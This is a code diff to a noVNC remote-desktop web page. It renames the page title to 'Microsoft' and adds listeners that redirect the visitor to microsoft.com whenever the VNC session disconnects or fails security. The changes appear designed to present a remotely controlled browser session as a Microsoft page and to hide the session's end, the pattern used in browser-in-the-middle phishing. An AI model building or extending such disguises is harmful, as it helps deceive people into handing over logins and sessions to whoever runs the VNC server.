@@ -1,8 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head><title>
-    
+
 </title>
+
+<!-- Manually Change Document Title -->
+<script>
+document.title = "Microsoft";
+</script>
     <meta charset="utf-8">
     <style>
         body {
@@ -74,8 +79,16 @@
         rfb.viewOnly = readQueryVariable('view_only', false);
         rfb.scaleViewport = readQueryVariable('scale', false);
 
+	// Redirect on unexpected disconnect
+	rfb.addEventListener("disconnect", (e) => {
+    		window.location.href = 'https://www.microsoft.com/';
+	});
+
+	// Redirect on security failure
+	rfb.addEventListener("securityfailure", (e) => {
+    		window.location.href = 'https://www.microsoft.com/';
+	});
     </script>
 </head>
-
 <body><div id="screen" style="background-color: white; color: white"></div>
 </body></html>
